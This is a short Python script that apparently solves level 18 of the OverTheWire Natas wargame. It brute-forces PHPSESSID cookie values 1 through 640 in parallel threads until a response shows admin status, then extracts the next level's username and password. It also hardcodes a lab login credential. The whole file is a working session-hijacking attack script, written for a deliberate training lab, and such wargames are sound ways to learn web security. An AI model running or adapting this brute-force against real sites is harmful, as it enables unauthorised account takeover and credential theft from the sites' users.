# PHP SessionID Bruteforce

import re
import threading
import requests
import colorama
from colorama import Fore, Style


def sessionIdBruteforce(i):
    resp = session.get(url=url, cookies={"PHPSESSID": str(i)})

    if "You are an admin" in resp.text:
        natas19_username = re.search("Username: (.*)", resp.text).group(1)
        natas19_password = re.search("Password: (.*)</pre>", resp.text).group(1)

        print(f"\n[+] {natas19_username}: {natas19_password}")


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Create a session and set the authorization credentials
session = requests.Session()


# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


# Empty Thread lists
threads = []


for i in range(1, 641):
    thread = threading.Thread(target=sessionIdBruteforce, args=(i,))
    thread.start()
    threads.append(thread)


# Wait for all threads to finish
for thread in threads:
    thread.join()
